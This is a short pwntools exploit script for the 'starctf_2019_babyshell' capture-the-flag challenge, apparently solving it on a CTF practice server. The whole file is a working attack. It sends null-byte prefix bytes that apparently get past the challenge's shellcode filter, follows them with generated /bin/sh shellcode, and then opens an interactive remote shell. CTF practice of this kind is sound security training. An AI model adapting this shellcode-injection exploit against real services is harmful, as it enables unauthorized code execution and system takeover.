from pwn import *

context.arch = 'amd64'

#p = process('./starctf_2019_babyshell')
p = remote('node4.buuoj.cn', 25649)

payload = b'\x00J\x00' + asm(shellcraft.sh())

p.sendlineafter(b'plz:\n', payload)

p.interactive()
